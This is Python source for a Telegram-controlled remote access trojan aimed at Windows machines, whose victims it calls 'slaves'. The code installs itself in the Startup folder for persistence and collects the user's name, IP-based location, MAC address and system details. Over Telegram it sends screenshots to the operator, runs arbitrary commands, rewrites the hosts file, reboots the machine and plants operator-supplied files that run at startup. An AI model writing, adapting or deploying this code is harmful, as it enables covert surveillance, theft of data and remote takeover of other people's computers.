import telebot
import os
import getpass
import socket
import pyautogui
import psutil
import platform
import speedtest
import geocoder
import subprocess
import ctypes
import sys
import shutil
import random
import requests
import time
from datetime import datetime
from uuid import getnode as get_mac
from PIL import Image
from telebot import types
#add to shell:startup
Thisfile = sys.argv[0] 
Thisfile_name = os.path.basename(Thisfile) 
user_path = os.path.expanduser('~') 

if not os.path.exists(f"{user_path}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\{Thisfile_name}"):
        os.system(f'copy "{Thisfile}" "{user_path}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"')

#data collection
name = getpass.getuser() # get username
g = geocoder.ip('me')#geo info
g  = str(g)
g = g.replace('<[OK] Ipinfo - Geocode ','')
g = g.replace('>','')
#ip = socket.gethostbyname(socket.getfqdn()) # system IP info
mac = get_mac() # MAC adress
ost = platform.uname() # Uname list
ost = str(ost)
ost = ost.replace('uname_result(', '')
ost = ost.replace(')', '')
token = ''#<============ Token here
#commands
bot = telebot.TeleBot(token, parse_mode=None)
@bot.message_handler(commands=['slaves'])#show slave info
def slaves(message):
	bot.reply_to(message, 'username: ' + name + '\ngeo: ' + str(g) + '\nsys: '+ str(ost))

@bot.message_handler(commands=[f'{name}_prtsc'])#make screenshoot
def prtsc(message):
	try:
		bot.reply_to(message,'processing...')
		screen = pyautogui. screenshot(f'{user_path}\\AppData\\screenshot.png')
		bot.send_photo(chat_id=message.from_user.id, photo = screen)
		os.remove(f'{user_path}\\AppData\\screenshot.png')
		bot.reply_to(message, 'Done')
	except Exception as e:
		bot.reply_to(message, e)

@bot.message_handler(commands=[f'{name}_cmd'])#input in cmd
def cmd(message):
	try:
		com = message.text
		com = com.replace(f'/{name}_cmd ','')
		subprocess.check_output(com)
		bot.reply_to(message, 'Done')
	except Exception as e:
		bot.reply_to(message, e)

@bot.message_handler(commands=[f'{name}_blockURL'])#block access to url
def blockURL(message, res=True):
    try:
        bot.reply_to(message, 'processing...')
        global hosts
        hosts = r'C:\Windows\System32\drivers\etc\hosts'
        global blocked_sites
        redirect_url = '127.0.0.1'
        blocked_sites = [message.text.split()[1]]
        with open(hosts, 'r+') as file:
            src = file.read()
            for site in blocked_sites:
                if site in src:
                    bot.send_message(message.chat.id, 'Error url already blocked')
                else:
                    file.write(f'{redirect_url} {site}\n')
                    bot.send_message(message.chat.id, 'Done url blocked')
    except Exception as e:
        bot.reply_to(message, e)

@bot.message_handler(commands=[f'{name}_mouse'])#shaking the mouse
def kill_mouse(message, res=True):
    try:
        text = ' '.join([str(elem) for elem in message.text.split()])
        text1 = text.replace(f'/{name}_mouse ', '')
        time = int(text1)
        bot.reply_to(message, 'processing...')
        for x in range(1,time):
            pyautogui.moveTo(random.randint(0,500),random.randint(0,500))
        bot.reply_to(message, 'Done')
    except Exception as e:
        bot.reply_to(message, e)

@bot.message_handler(content_types=['voice'])#run audio on slaves pc
def voice_loader(message, res=True):
    try:
        bot.reply_to(message, 'processing...')
        file_info = bot.get_file(message.voice.file_id)
        file = requests.get('https://api.telegram.org/file/bot{0}/{1}'.format(token, file_info.file_path))
        with open('voice.ogg','wb') as f:
            f.write(file.content)
        os.system('voice.ogg')
        time.sleep(10)
        os.remove('voice.ogg')
        bot.reply_to(message, 'Done')
    except Exception as e:
        bot.reply_to(message, e)

@bot.message_handler(commands=['restart'])#reboot slave pc
def restart(message, res=True):
    try:
        bot.reply_to(message, 'processing...')
        os.system('shutdown /r /t 0')
    except Exception as e:
        bot.reply_to(message, e)

@bot.message_handler(content_types=['document'])#download file to shell:startup
def doc_loader(message):
    try:
        bot.reply_to(message, 'processing...')
        file_info = bot.get_file(message.document.file_id)

        downloaded_file = bot.download_file(file_info.file_path)

        src = f'{user_path}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\' + '\\' + message.document.file_name;
        with open(src, 'wb') as new_file:
            new_file.write(downloaded_file)

        bot.reply_to(message, "file was set to autoload")
    except Exception as e:
        bot.reply_to(message, e)

@bot.message_handler(commands=[f'{name}_unhook'])#unhook slave and reboot pc
def unhook(message):
	try:
		bot.reply_to(message, f'{name}, was unhook!')
		f"{user_path}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\{Thisfile_name}"
		os.system('shutdown /r /t 10')
		exit()
	except Exception as e:
		bot.reply_to(message, e)
bot.infinity_polling()

